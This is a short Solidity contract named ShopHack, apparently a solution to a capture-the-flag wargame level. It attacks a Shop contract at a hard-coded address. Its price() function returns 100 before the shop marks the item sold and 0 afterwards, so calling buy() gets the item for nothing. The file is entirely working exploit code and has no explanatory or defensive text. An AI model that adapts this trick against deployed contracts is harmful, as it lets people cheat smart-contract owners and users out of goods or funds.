// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IShop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract ShopHack {
    IShop public shop = IShop(0xA4F2CaA5d20dA5FcE5Dc9E7049a112E067297cA9);

    function price() public view returns (uint256) {
        return IShop(msg.sender).isSold() ? 0 : 100;
    }

    function buy() public {
        shop.buy();
    }
}
